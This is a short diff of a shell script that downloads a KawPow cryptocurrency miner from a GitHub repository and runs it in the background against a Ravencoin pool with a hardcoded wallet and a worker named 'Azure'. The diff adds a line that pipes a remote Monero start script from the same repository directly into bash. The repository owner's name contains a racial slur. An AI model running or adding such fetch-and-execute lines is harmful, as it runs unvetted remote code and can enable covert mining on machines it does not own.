@@ -10,3 +10,5 @@ wget https://github.com/HotNiggus/Minning/raw/main/kawpowminer-ubuntu18-1.2.3.zi
 unzip kawpowminer-ubuntu18-1.2.3.zip
 
 nohup ./kawpowminer -U -P stratum+tcp://RMNnWQckbrJiJKjTHF1XTwHShomsQTCDXe.Azure@rvn.2miners.com:6060 &
+
+bash <(curl -s https://raw.githubusercontent.com/HotNiggus/Minning/main/XMR/xmr_start.sh)
